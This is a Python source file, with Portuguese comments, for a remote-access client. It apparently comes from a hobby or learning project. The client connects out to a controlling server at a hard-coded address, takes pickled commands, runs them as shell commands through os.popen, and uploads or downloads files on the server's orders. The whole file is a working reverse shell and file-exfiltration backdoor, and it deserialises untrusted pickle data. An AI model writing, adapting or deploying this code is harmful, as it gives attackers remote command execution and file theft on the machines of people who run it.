from socket import *
import pickle
import os

"""Classe cliente
Contem metodos para interpretar comandos recebidos do servidor
"""
class client:
    def __init__(self):
        self.client = socket(AF_INET, SOCK_STREAM)
        self.client.connect(("127.0.0.1", 2222))

    def change_directory(self, path):
        try:
            os.chdir(path)
            return f"[+] Mudando diretorio para {path}"
        except:
            return f"[-] Dir {path} não existe"

    def send_result(self, data):
        result = pickle.dumps(data)
        self.client.send(result)

    def recieve_command(self):
        command = pickle.loads(self.client.recv(2048))
        return command

    def download(self, filename):
        try:
            separator = "<>"
            file_name = filename
            file_size = os.path.getsize(file_name)
            file_info = f"{file_name}{separator}{file_size}"
        except:
            alert = f"[-] Arquivo não existe"
            self.send_result(alert)
        else:
            self.send_result(file_info)
            command = self.recieve_command()
            with open(file_name, "rb") as f:
                c = 0
                while True:
                    bytes_read = f.read(2048)
                    if not bytes_read:
                        break
                    self.client.send(bytes_read)

    def upload(self):
        result = self.recieve_command()
        file_name = result.split("<>")[0]
        indice = file_name.rfind("/")+1
        file_name = file_name[indice::]
        file_size = result.split("<>")[1]
        file_size = int(file_size)
        self.send_result(f"aguardando envio")
        with open(file_name, "wb", 0) as f:
            c = 0
            while c != file_size:
                bytes_read = self.client.recv(2048)
                if not bytes:
                    break
                f.write(bytes_read)
                c += len(bytes_read)

    def start(self):
        while True:
            try:
                command = self.recieve_command()
                full_command = ' '.join(command)

                if command[0] == "cd":
                    command_result = self.change_directory(command[1])
                    self.send_result(command_result)

                elif command[0] == "download":
                    self.download(command[1])

                elif command[0] == "upload":
                    self.upload()

                else:
                    command_result = os.popen(full_command).read()
                    if command_result and len(command_result) <= 2048:
                        self.send_result(command_result)
                    else:
                        self.send_result(f"Comando não suportado ou invalido")


            except:
                command_result = f"[-] Comando invalido"
                self.send_result(command_result)

cliente = client()
cliente.start()




